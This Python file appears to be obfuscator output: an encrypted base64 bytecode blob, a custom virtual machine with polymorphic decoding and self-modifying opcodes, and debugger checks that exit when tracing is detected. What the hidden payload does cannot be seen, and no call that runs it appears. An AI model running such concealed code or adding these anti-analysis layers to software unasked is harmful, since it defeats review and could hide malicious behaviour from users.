#!/usr/bin/env python3
def _rfoacoaks(_zeqyjzfv):
    return _zeqyjzfv % 4150 + 1

import hashlib as _ooyjwkgp, hmac as _dpweyflet, base64 as _nekcm, sys as _kzmuxh, zlib as _ofumrabw
_zeqyjzfv = 633316
_ssiqzv = """Vbfjn26YgA6lR3BF71v978KWrxi2qf75yJnPIZ7D8ql2RBJg+4Ot9nLIxYGO/UOMkclh/JQe6ZvpaaRSM1tXz8hC8p/lPlIrWX7Q7+UZXLAjez7P7+13XEC3tOB1hVz8LQQtk7FfwpWIRnJvuhB2GyOA5PlZ5aM/JHi3R3oIjKSu/1SmNM1kpfEg7PnuQeKCylMzZN7GzEJVPeilF2cKHAiNLapQ9AqFC8b45tXgkjr2FgnAML2kSOzjVzNznRxZLZppbISF9hYxNjHZntcxdBz/FShLcPibWN956DBNLsflCQQV8QZ6P9hMq9BvK63F9wQh3bujWPnmDissEA7fxUibsIoChxa90vfp5iEjshtCkxz1H2jHKu7fbTcH/KnAFc4xIdl/RzIDCxgWeEUMp+kjnaX6WtMUasLFYBzVVQje16cT5QwdabajMKP/Vv0c9rQx8/kvO8fGSmg7jK1sycL28WFYP/boM9H92m6FHhzEAU6jVqgnu80K8nemhJC7K3WvDSzPP4WVAdEtKQr7YbdnUZ3h7aaS0VuVtcme5dJ/9L9EY0Kx3HZTagwEjkTQ8IXImbVz+ZRe33V7mOtRXmfNhXuo4EB7cb+ZuQVMrQwT7yQlS53rkYu7c8I0Rz+KZ4MaN4yRcVkc7C8Cjf+vQt+eidXIHQunt6Kkqm4AbGZ+JwujzBpIkWPbuOLVNGf5RU33swXWmkCr634REZjkFIb17mNvzPdV4kPO4e2tjuEmuQ2FwJ0CgQfaK5J/ZHQ8Qh5XpxlFKJLOmevfDD7Rv5N3+RkiAJKLA/XgIuksJCBaHceRdXzXI9E9Vp/nGsK0WDpwtFxllVG7SFgRFu4Kyu8aaJWzg1c66xrRWpiJOW3hZKjrq35EN9R+GEkgIfaSV82dZGecXJLnMHzex6d985MOffo="""
_vqkbcm = 3
_agcdbge = _rfoacoaks(_zeqyjzfv)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _flags = int.from_bytes(bytes(_map[252:256]), 'little')
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    _pos = 256
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _ibqzcl():
    if _kzmuxh.gettrace() is not None:
        _kzmuxh.stderr.write('error: debugger detected\n'); _kzmuxh.exit(1)
